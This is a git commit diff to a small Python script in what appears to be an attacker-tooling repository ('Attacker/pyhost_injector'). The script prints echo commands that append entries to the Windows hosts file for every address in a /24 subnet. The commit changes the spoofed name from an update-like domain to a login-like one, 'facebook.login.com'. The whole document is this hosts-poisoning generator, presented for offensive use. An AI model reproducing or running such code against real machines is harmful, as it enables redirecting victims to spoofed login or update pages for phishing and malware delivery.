1e3fe4d6af2ca9b2d9ed2125454d2254cb00b22c
nu11secur1ty <venvaropt@gmail.com>
2019-11-22 11:00:31 +0200

    Update 19216811.py

--- Attacker/pyhost_injector/19216811.py
+++ Attacker/pyhost_injector/19216811.py
@@ -3,5 +3,5 @@
 # v-1.0
 import ipaddress
 for ip in ipaddress.IPv4Network('192.168.1.0/24'):
-    host = "microsoft.update.com >> %hostspath%"
+    host = "facebook.login.com >> %hostspath%"
     print("echo",'',ip,'','','',host)
